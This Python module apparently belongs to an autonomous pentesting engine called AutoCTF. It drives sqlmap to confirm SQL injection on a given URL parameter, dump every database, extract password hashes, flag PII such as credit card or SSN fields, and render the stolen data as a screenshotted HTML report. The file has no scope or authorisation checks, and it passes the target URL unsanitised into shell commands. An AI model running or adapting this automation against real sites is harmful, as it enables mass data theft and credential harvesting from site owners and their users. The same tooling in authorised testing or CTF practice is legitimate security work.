from mcp.exec_client import exec_command
from mcp.browserbase_client import get_client, close_session
import asyncio
import os
import json
import logging
from datetime import datetime

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

async def try_sqli(url: str, param: str):
    """
    Advanced SQLi exploitation with full DB dump
    Returns: (success, dump_data_dict)
    """
    # Create output directory for this run
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    output_dir = f"/tmp/sqlmap_dumps/{timestamp}"

    print(f"üîç Testing SQLi on {url}?{param}=...")

    # Step 1: Test for SQLi vulnerability
    test_cmd = f'sqlmap -u "{url}?{param}=test" --batch --risk=2 --level=2 --technique=BEUSTQ --threads=5'
    test_result = await exec_command(test_cmd)

    if "is vulnerable" not in test_result.lower() and "injectable" not in test_result.lower():
        print("‚ùå No SQLi detected")
        return False, {"error": "No SQLi vulnerability detected", "output": test_result[:500]}

    print("‚úÖ SQLi vulnerability CONFIRMED!")

    # Step 2: Enumerate databases
    print("üìä Enumerating databases...")
    dbs_cmd = f'sqlmap -u "{url}?{param}=test" --batch --dbs --threads=5'
    dbs_result = await exec_command(dbs_cmd)

    # Step 3: Dump current database
    print("üíæ Dumping database contents...")
    dump_cmd = f'sqlmap -u "{url}?{param}=test" --batch --dump --threads=5 --dump-format=JSON --output-dir={output_dir}'
    dump_result = await exec_command(dump_cmd)

    # Step 4: Extract credentials (common table names)
    print("üîë Extracting credentials...")
    creds_cmd = f'sqlmap -u "{url}?{param}=test" --batch --passwords --threads=5'
    creds_result = await exec_command(creds_cmd)

    # Parse and structure the results
    dump_data = {
        "vulnerable": True,
        "url": url,
        "parameter": param,
        "test_output": test_result[:1000],
        "databases": extract_databases(dbs_result),
        "dump_output": dump_result,
        "credentials": extract_credentials(creds_result),
        "dump_files": [],
        "summary": generate_exploit_summary(dump_result, creds_result)
    }

    # Try to read dump files
    try:
        dump_files = await exec_command(f"find {output_dir} -name '*.csv' -o -name '*.json' 2>/dev/null")
        dump_data["dump_files"] = dump_files.strip().split("\n") if dump_files.strip() else []
    except:
        pass

    print(f"‚úÖ SQLi exploitation complete! Dumped {len(dump_data['databases'])} databases")

    return True, dump_data


def extract_databases(sqlmap_output: str):
    """Extract database names from sqlmap output"""
    databases = []
    lines = sqlmap_output.split("\n")
    in_db_section = False

    for line in lines:
        if "available databases" in line.lower():
            in_db_section = True
            continue
        if in_db_section and line.strip().startswith("[*]"):
            db_name = line.strip().replace("[*]", "").strip()
            if db_name and db_name not in ["information_schema", "mysql", "performance_schema"]:
                databases.append(db_name)

    return databases


def extract_credentials(sqlmap_output: str):
    """Extract credentials from sqlmap output"""
    credentials = []
    lines = sqlmap_output.split("\n")

    for i, line in enumerate(lines):
        if "password" in line.lower() or "hash" in line.lower():
            # Capture context around credential mentions
            context = "\n".join(lines[max(0, i-2):min(len(lines), i+3)])
            credentials.append(context)

    return credentials[:10]  # Limit to 10 credential entries


def generate_exploit_summary(dump_output: str, creds_output: str):
    """Generate a hackerish summary of the exploitation"""
    summary_lines = [
        "üéØ SQLi EXPLOITATION SUCCESSFUL",
        "=" * 50,
    ]

    # Count tables dumped
    table_count = dump_output.lower().count("table '")
    if table_count > 0:
        summary_lines.append(f"üìä Dumped {table_count} tables from database")

    # Check for credentials
    if "password" in creds_output.lower() or "hash" in creds_output.lower():
        summary_lines.append("üîë CREDENTIALS EXTRACTED - Check dump for hashes/passwords")

    # Check for sensitive data
    if any(keyword in dump_output.lower() for keyword in ["user", "admin", "email", "credit", "ssn"]):
        summary_lines.append("‚ö†Ô∏è  SENSITIVE DATA EXPOSED - PII/Credentials found")

    summary_lines.append("=" * 50)
    summary_lines.append("‚úÖ Full database dump completed")

    return "\n".join(summary_lines)


async def create_dump_screenshot(dump_data: dict, target_url: str):
    """
    Create an HTML visualization of the DB dump and screenshot it
    Returns: screenshot_url
    """
    # Get Browserbase client
    bb_client = get_client()

    # Check if Browserbase is enabled
    if not bb_client.is_enabled():
        logger.warning("‚ö†Ô∏è  Browserbase disabled - skipping screenshot")
        return None

    try:
        # Create HTML visualization of the dump
        html_content = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>SQLi DB Dump - AutoCTF</title>
            <style>
                body {{
                    background: #0a0e27;
                    color: #00ff41;
                    font-family: 'Courier New', monospace;
                    padding: 20px;
                    margin: 0;
                }}
                .header {{
                    border: 2px solid #00ff41;
                    padding: 20px;
                    margin-bottom: 20px;
                    background: #0d1117;
                }}
                .section {{
                    border: 1px solid #30363d;
                    padding: 15px;
                    margin: 15px 0;
                    background: #161b22;
                }}
                h1, h2 {{ color: #00ff41; text-shadow: 0 0 10px #00ff41; }}
                .crit {{ color: #ff0000; font-weight: bold; }}
                .success {{ color: #00ff41; }}
                .info {{ color: #58a6ff; }}
                pre {{
                    background: #0d1117;
                    border: 1px solid #30363d;
                    padding: 10px;
                    overflow-x: auto;
                    font-size: 12px;
                }}
                .db-list {{ list-style: none; padding: 0; }}
                .db-list li {{ padding: 5px 0; border-bottom: 1px dotted #30363d; }}
                .credentials {{
                    background: #1a1e2e;
                    border-left: 4px solid #ff0000;
                    padding: 10px;
                    margin: 10px 0;
                }}
            </style>
        </head>
        <body>
            <div class="header">
                <h1>üéØ SQLi DATABASE DUMP - AutoCTF</h1>
                <div class="info">Target: {dump_data.get('url', 'N/A')}</div>
                <div class="info">Parameter: {dump_data.get('parameter', 'N/A')}</div>
                <div class="info">Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}</div>
            </div>

            <div class="section">
                <h2>üìä EXPLOITATION SUMMARY</h2>
                <pre class="success">{dump_data.get('summary', 'N/A')}</pre>
            </div>

            <div class="section">
                <h2>üíæ DATABASES DISCOVERED</h2>
                <ul class="db-list">
                    {''.join([f'<li class="success">‚úì {db}</li>' for db in dump_data.get('databases', [])])}
                </ul>
                {f'<p class="info">Total: {len(dump_data.get("databases", []))} databases</p>' if dump_data.get('databases') else '<p class="crit">No databases enumerated</p>'}
            </div>

            <div class="section">
                <h2>üîë CREDENTIALS EXTRACTED</h2>
                {''.join([f'<div class="credentials"><pre>{cred}</pre></div>' for cred in dump_data.get('credentials', [])])}
                {f'<p class="crit">Found {len(dump_data.get("credentials", []))} credential entries</p>' if dump_data.get('credentials') else '<p class="info">No credentials extracted</p>'}
            </div>

            <div class="section">
                <h2>üìÅ DUMP FILES</h2>
                <ul class="db-list">
                    {''.join([f'<li class="info">{f}</li>' for f in dump_data.get('dump_files', [])])}
                </ul>
            </div>

            <div class="section">
                <h2>üîç RAW OUTPUT (Truncated)</h2>
                <pre>{dump_data.get('dump_output', 'N/A')[:2000]}</pre>
            </div>

            <div class="header" style="margin-top: 30px;">
                <p class="success">‚úÖ EXPLOITATION COMPLETE</p>
                <p class="info">Generated by AutoCTF Autonomous Pentesting Engine</p>
            </div>
        </body>
        </html>
        """

        # Save HTML file
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        html_path = f"/tmp/sqlmap_dumps/dump_{timestamp}.html"
        os.makedirs(os.path.dirname(html_path), exist_ok=True)

        with open(html_path, "w") as f:
            f.write(html_content)

        logger.info(f"üì∏ Created HTML visualization: {html_path}")

        # Create screenshot using browserbase
        session_id = None
        try:
            # Create session with reuse enabled
            session = bb_client.create_session(reuse=True)

            if session and hasattr(session, 'id'):
                session_id = session.id

                # Capture screenshot
                screenshot_url = bb_client.screenshot(session.id, f"file://{html_path}")

                if screenshot_url:
                    logger.info(f"üì∏ Screenshot captured: {screenshot_url}")
                    return screenshot_url
                else:
                    logger.warning("‚ö†Ô∏è  Screenshot URL not generated")
                    return html_path
            else:
                logger.warning("‚ö†Ô∏è  Failed to create Browserbase session")
                return html_path

        except Exception as e:
            logger.error(f"‚ö†Ô∏è  Screenshot capture failed: {e}")
            # Return HTML path as fallback
            return html_path

        finally:
            # Clean up session if not reusing
            # Note: We let the client handle cleanup automatically
            pass

    except Exception as e:
        logger.error(f"‚ùå Failed to create dump screenshot: {e}")
        return None